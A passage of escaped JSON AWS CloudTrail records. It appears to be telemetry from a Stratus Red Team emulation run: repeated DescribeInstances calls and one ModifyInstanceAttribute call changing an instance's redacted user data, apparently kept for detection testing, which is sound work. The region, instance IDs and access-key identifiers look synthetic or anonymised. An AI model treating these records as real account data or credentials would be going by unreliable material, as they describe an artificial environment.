\"principalId\": \"AIDAV0KQ3LIBUIGZ52WB\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"ca-northsouth-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"9e6d9e21-0c9c-49f7-b2b6-59c863d7a6a3\",\n      \"eventName\": \"DescribeInstances\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:04:19Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"309303190113\",\n      \"requestID\": \"2ff3ad22-ffc2-4926-bbdd-15356ec9bd4a\",\n      \"requestParameters\": {\n         \"filterSet\": {},\n         \"instancesSet\": {\n            \"items\": [\n               {\n                  \"instanceId\": \"i-DDd6c7B0e18F0E35f\"\n               }\n            ]\n         }\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"251.228.255.218\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.ca-northsouth-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_54d79918-8729-4201-83e6-6a600173b8e3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAZI86ACIZ2J9CV86Z\",\n         \"accountId\": \"309303190113\",\n         \"arn\": \"arn:aws:iam::309303190113:user/christophe\",\n         \"principalId\": \"AIDAV0KQ3LIBUIGZ52WB\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"ca-northsouth-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"f634894e-d625-4b7b-b1c1-50354cc1100e\",\n      \"eventName\": \"ModifyInstanceAttribute\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:04:18Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"309303190113\",\n      \"requestID\": \"5c0d7f09-a80a-4313-b848-bc858fa4a8ad\",\n      \"requestParameters\": {\n         \"instanceId\": \"i-DDd6c7B0e18F0E35f\",\n         \"userData\": \"\\u003csensitiveDataRemoved\\u003e\"\n      },\n      \"responseElements\": {\n         \"_return\": true,\n         \"requestId\": \"5c0d7f09-a80a-4313-b848-bc858fa4a8ad\"\n      },\n      \"sourceIPAddress\": \"251.228.255.218\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.ca-northsouth-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_54d79918-8729-4201-83e6-6a600173b8e3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAZI86ACIZ2J9CV86Z\",\n         \"accountId\": \"309303190113\",\n         \"arn\": \"arn:aws:iam::309303190113:user/christophe\",\n         \"principalId\": \"AIDAV0KQ3LIBUIGZ52WB\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"ca-northsouth-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"8730ad3a-d87e-4463-aaba-d600442be64c\",\n      \"eventName\": \"DescribeInstances\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:04:17Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"309303190113\",\n      \"requestID\": \"4ddaaecc-3c8d-420f-8646-977ad02fbbe5\",\n      \"requestParameters\": {\n         \"filterSet\": {},\n         \"instancesSet\": {\n            \"items\": [\n               {\n                  \"instanceId\": \"i-DDd6c7B0e18F0E35f\"\n               }\n            ]\n         }\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"251.228.255.218\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.ca-northsouth-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_54d79918-8729-4201-83e6-6a600173b8e3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAZI86ACIZ2J9CV86Z\",\n         \"accountId\": \"309303190113\",\n         \"arn\": \"arn:aws:iam::309303190113:user/christophe\",\n         \"principalId\": \"AIDAV0KQ3LIBUIGZ52WB\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"ca-northsouth-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"50019cea-afa8-4dc4-b61d-b9454e6d2aba\",\n      \"eventName\": \"DescribeInstances\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:04:16Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"309303190113\",\n      \"requestID\": \"277adb54-968d-4460-aeaa-a59d65139225\",\n      \"requestParameters\": {\n         \"filterSet\": {},\n         \"instancesSet\": {\n            \"items\": [\n               {\n                  \"instanceId\": \"i-DDd6c7B0e18F0E35f\"\n               }\n            ]\n         }\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"251.228.255.218\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.ca-northsouth-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_54d79918-8729-4201-83e6-6a600173b8e3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAZI86ACIZ2J9CV86Z\",\n         \"accountId\": \"309303190113\",\n         \"arn\": \"arn:aws:iam::309303190113:user/christophe\",\n         \"principalId\": \"AIDAV0KQ3LIBUIGZ52WB\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"ca-northsouth-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"ae0d4f37-4d8c-49e1-ab78-2c7157ffc9d3\",\n      \"eventName\": \"DescribeInstances\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:04:14Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"309303190113\",\n      \"requestID\": \"b38aa588-4cc4-4279-8117-2d1d06d8ff1f\",\n      \"requestParameters\": {\n         \"filterSet\": {},\n         \"instancesSet\": {\n            \"items\": [\n               {\n                  \"instanceId\": \"i-DDd6c7B0e18F0E35f\"\n               }\n            ]\n         }\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"251.228.255.218\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.ca-northsouth-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_54d79918-8729-4201-83e6-6a600173b8e3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAZI86ACIZ2J9CV86Z\",\n         \"accountId\": \"309303190113\",\n         \"arn\": \"arn:aws:iam::309303190113:user/christophe\",\n         \"principalId\": \"AIDAV0KQ3LIBUIGZ52WB\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"ca-northsouth-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"daeb8d2a-a83b-4a37-8ba3-e60b3d0b69d1\",\n      \"eventName\": \"DescribeInstances\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:04:11Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"309303190113\",\n      \"requestID\": \"e1ae237b-0241-4999-be50-44fd16f7e368\",\n      \"requestParameters\": {\n         \"filterSet\": {},\n         \"instancesSet\": {\n            \"items\": [\n               {\n                  \"instanceId\": \"i-DDd6c7B0e18F0E35f\"\n               }\n            ]\n         }\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"251.228.255.218\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.ca-northsouth-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_54d79918-8729-4201-83e6-6a600173b8e3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAZI86ACIZ2J9CV86Z\",\n         \"accountId\": \"309303190113\",\n         \"arn\": \"arn:aws:iam::309303190113:user/christophe\",\n         \"principalId\": \"AIDAV0KQ3LIBUIGZ52WB\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"ca-northsouth-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"c751234f-ec7b-40d7-af60-188d8749b08f\",\n      \"eventName\": \"DescribeInstances\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:04:10Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"309303190113\",\n      \"requestID\": \"398556fa-3fe5-4872-9d6f-a994e54731ed\",\n      \"requestParameters\": {\n         \"filterSet\": {},\n         \"instancesSet\": {\n            \"items\": [\n               {\n                  \"instanceId\": \"i-DDd6c7B0e18F0E35f\"\n               }\n            ]\n         }\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"251.228.255.218\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.ca-northsouth-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_54d79918-8729-4201-83e6-6a600173b8e3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAZI86ACIZ2J9CV86Z\",\n         \"accountId\": \"309303190113\",\n         \"arn\": \"arn:aws:iam::309303190113:user/christophe\",\n         \"principalId\": \"AIDAV0KQ3LIBUIGZ52WB\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"ca-northsouth-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"bed3162f-6f64-4f6f-b08b-78d3ac9b9066\",\n      \"eventName\": \"DescribeInstances\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:04:08Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"309303190113\",\n      \"requestID\": \"6e302813-c59e-49bc-ba23-89109cd64119\",\n      \"requestParameters\": {\n         \"filterSet\": {},\n         \"instancesSet\": {\n            \"items\": [\n               {\n                  \"instanceId\": \"i-DDd6c7B0e18F0E35f\"\n               }\n            ]\n         }\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"251.228.255.218\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.ca-northsouth-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_54d79918-8729-4201-83e6-6a600173b8e3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAZI86ACIZ2J9CV86Z\",\n         \"accountId\": \"309303190113\",\n         \"arn\": \"arn:aws:iam::309303190113:user/christophe\",\n         \"principalId\": \"AIDAV0KQ3LIBUIGZ52WB\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"ca-northsouth-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"42d2c954-4b4c-4889-ad26-80796fe87025\",\n      \"eventName\": \"DescribeInstances\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:04:06Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"309303190113\",\n      \"requestID\": \"8e3e3e2d-9593-442e-b8e5-335362f0a5df\",\n      \"requestParameters\": {\n         \"filterSet\": {},\n         \"instancesSet\": {\n            \"items\": [\n               {\n                  \"instanceId\": \"i-DDd6c7B0e18F0E35f\"\n               }\n            ]\n         }\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"251.228.255.218\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.ca-northsouth-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_54d79918-8729-4201-83e6-6a600173b8e3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAZI86ACIZ2J9CV86Z\",\n         \"accountId\": \"309303190113\",\n         \"arn\": \"arn:aws:iam::309303190113:user/christophe\",\n         \"principalId\": \"AIDAV0KQ3LIBUIGZ52WB\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"ca-northsouth-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"2a1cbb02-88fd-4405-90f8-7d5bcb65b0f3\",\n      \"eventName\": \"DescribeInstances\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:04:04Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"309303190113\",\n      \"requestID\": \"6d4d0e20-28c5-4bb0-90f2-57dfdc42aeab\",\n      \"requestParameters\": {\n         \"filterSet\": {},\n         \"instancesSet\": {\n            \"items\": [\n               {\n                  \"instanceId\": \"i-DDd6c7B0e18F0E35f\"\n               }\n            ]\n         }\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"251.228.255.218\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.ca-northsouth-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_54d79918-8729-4201-83e6-6a600173b8e3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAZI86ACIZ2J9CV86Z\",\n         \"accountId\": \"309303190113\",\n         \"arn\": \"arn:aws:iam::309303190113:user/christophe\",\n         \"principalId\": \"AIDAV0KQ3LIBUIGZ52WB\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"ca-northsouth-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"56b0bf8c-92fe-460c-aaa6-ba5b9d816bea\",\n      \"eventName\": \"DescribeInstances\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:04:03Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"309303190113\",\n      \"requestID\": \"a5ae54e8-dbcc-498c-ba6c-b7caff1d8302\",\n      \"requestParameters\": {\n         \"filterSet\": {},\n         \"instancesSet\": {\n            \"items\": [\n               {\n                  \"instanceId\": \"i-DDd6c7B0e18F0E35f\"\n               }\n            ]\n         }\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"251.228.255.218\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.ca-northsouth-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_54d79918-8729-4201-83e6-6a600173b8e3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAZI86ACIZ2J9CV86Z\",\n         \"accountId\": \"309303190113\",\n         \"arn\": \"arn:aws:iam::309303190113:user/christophe\",\n         \"principalId\": \"AIDAV0KQ3LIBUIGZ52WB\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"ca-northsouth-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"5e44de78-52a2-4d5b-9b85-715f68110d00\",\n      \"eventName\": \"DescribeInstances\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:04:00Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"309303190113\",\n      \"requestID\": \"6a7b7a28-eaa1-4a78-b7db-d5eb9b687773\",\n      \"requestParameters\": {\n         \"filterSet\": {},\n         \"instancesSet\": {\n            \"items\": [\n               {\n                  \"instanceId\": \"i-DDd6c7B0e18F0E35f\"\n               }\n            ]\n         }\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"251.228.255.218\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.ca-northsouth-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_54d79918-8729-4201-83e6-6a600173b8e3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAZI86ACIZ2J9CV86Z\",\n         \"accountId\": \"309303190113\",\n         \"arn\": \"arn:aws:iam::309303190113:user/christophe\",\n         \"principalId\": \"AIDAV0KQ3LIBUIGZ52WB\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"ca-northsouth-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"7d0f96bf-ca3b-4bb6-b9ea-2cb20cbd3f64\",\n      \"eventName\": \"DescribeInstances\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:03:58Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"309303190113\",\n      \"requestID\": \"21738dd4-cde5-4783-a4d9-341ffbb3d0f0\",\n      \"requestParameters\": {\n         \"filterSet\": {},\n         \"instancesSet\": {\n            \"items\": [\n               {\n                  \"instanceId\": \"i-DDd6c7B0e18F0E35f\"\n               }\n            ]\n         }\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"251.228.255.218\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.ca-northsouth-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_54d79918-8729-4201-83e6-6a600173b8e3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAZI86ACIZ2J9CV86Z\",\n         \"accountId\": \"309303190113\",\n         \"arn\": \"arn:aws:iam::309303190113:user/christophe\",\n         \"principalId\": \"AIDAV0KQ3LIBUIGZ52WB\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"ca-northsouth-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"10469acd-d180-4b62-a768-15726f788cf6\",\n      \"eventName\": \"DescribeInstances\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:03:57Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"309303190113\",\n      \"requestID\": \"cf1342c3-7142-4ce3-ace0-c3d6cb8ef53d\",\n      \"requestParameters\": {\n         \"filterSet\": {},\n         \"instancesSet\": {\n            \"items\": [\n               {\n                  \"instanceId\": \"i-DDd6c7B0e18F0E35f\"\n               }\n            ]\n         }\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"251.228.255.218\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.ca-northsouth-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_54d79918-8729-4201-83e6-6a600173b8e3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAZI86ACIZ2J9CV86Z\",\n         \"accountId\": \"309303190113\",\n         \"arn\": \"arn:aws:iam::309303190113:user/christophe\",\n         \"principalId\": \"AIDAV0KQ3LIBUIGZ52WB\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"ca-northsouth-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"273a42f8-7c86-43f9-aabd-a698d0c5931a\",\n      \"eventName\": \"DescribeInstances\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:03:55Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"309303190113\",\n      \"requestID\": \"3d41ca74-ae92-45de-ab0e-3c7ad6a38c24\",\n      \"requestParameters\": {\n         \"filterSet\": {},\n         \"instancesSet\": {\n            \"items\": [\n               {\n                  \"instanceId\": \"i-DDd6c7B0e18F0E35f\"\n               }\n            ]\n         }\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"251.228.255.218\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.ca-northsouth-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_54d79918-8729-4201-83e6-6a600173b8e3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAZI86ACIZ2J9CV86Z\",\n         \"accountId\": \"309303190113\",\n         \"arn\": \"arn:aws:iam::309303190113:user/christophe\",\n         \"principalId\": \"AIDAV0KQ3LIBUIGZ52WB\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"ca-northsouth-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"b788f6c8-3155-4d3b-ac7d-9fd49e6be119\",\n      \"eventName\": \"DescribeInstances\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:03:53Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"309303190113\",\n      \"requestID\": \"bf4fb83d-1fea-48c5-ab76-8914ce05ade1\",\n      \"requestParameters\": {\n         \"filterSet\": {},\n         \"instancesSet\": {\n            \"items\": [\n               {\n                  \"instanceId\": \"i-DDd6c7B0e18F0E35f\"\n               }\n            ]\n         }\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"251.228.255.218\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.ca-northsouth-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_54d79918-8729-4201-83e6-6a600173b8e3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAZI86ACIZ2J9CV86Z\",\n         \"accountId\": \"309303190113\",\n         \"arn\": \"arn:aws:iam::309303190113:user/christophe\",\n         \"principalId\": \"AIDAV0KQ3LIBUIGZ52WB\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"ca-northsouth-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"8ced3c60-7e3a-447a-9abe-c80ea783e54a\",\n      \"eventName\": \"DescribeInstances\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:03:51Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"309303190113\",\n      \"requestID\": \"2ff0ddac-4e87-448d-817e-5ec5e0d62ffa\",\n      \"requestParameters\": {\n         \"filterSet\": {},\n         \"instancesSet\": {\n            \"items\": [\n               {\n                  \"instanceId\": \"i-DDd6c7B0e18F0E35f\"\n               }\n            ]\n         }\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"251.228.255.218\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.ca-northsouth-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_54d79918-8729-4201-83e6-6a600173b8e3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAZI86ACIZ2J9CV86Z\",\n         \"accountId\": \"309303190113\",\n         \"arn\": \"arn:aws:iam::309303190113:user/christophe\",\n         \"principalId\": \"AIDAV0KQ3LIBUIGZ52WB\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"ca-northsouth-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"933be44e-6ef0-44f6-a64b-99f067a71cd8\",\n      \"eventName\": \"DescribeInstances\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:03:50Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"309303190113\",\n      \"requestID\": \"5bc0fc4e-a4fc-40b9-8a28-621a02c58e55\",\n      \"requestParameters\": {\n         \"filterSet\": {},\n         \"instancesSet\": {\n            \"items\": [\n               {\n                  \"instanceId\": \"i-DDd6c7B0e18F0E35f\"\n               }\n            ]\n         }\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"251.228.255.218\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.ca-northsouth-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_54d79918-8729-4201-83e6-6a600173b8e3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAZI86ACIZ2J9CV86Z\",\n         \"accountId\": \"309303190113\",\n         \"arn\": \"arn:aws:iam::309303190113:user/christophe\",\n         \"principalId\": \"AIDAV0KQ3LIBUIGZ52WB\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"ca-northsouth-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"7eba0527-9926-4c43-8670-a4a1d2b8a466\",\n      \"eventName\": \"DescribeInstances\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:03:48Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"309303190113\",\n      \"requestID\": \"6434fc93-d1b5-44f6-9d82-5323e1059b23\",\n      \"requestParameters\": {\n         \"filterSet\": {},\n         \"instancesSet\": {\n            \"items\": [\n               {\n                  \"instanceId\": \"i-DDd6c7B0e18F0E35f\"\n               }\n            ]\n         }\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"251.228.255.218\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.ca-northsouth-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_54d79918-8729-4201-83e6-6a600173b8e3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAZI86ACIZ2J9CV86Z\",\n         \"accountId\": \"309303190113\",\n         \"arn\": \"arn:aws:iam::309303190113:user/christophe\",\n         \"principalId\": \"AIDAV0KQ3LIBUIGZ52WB\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"ca-northsouth-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"7a03fd83-ae64-41b4-b109-f672ccf01377\",\n      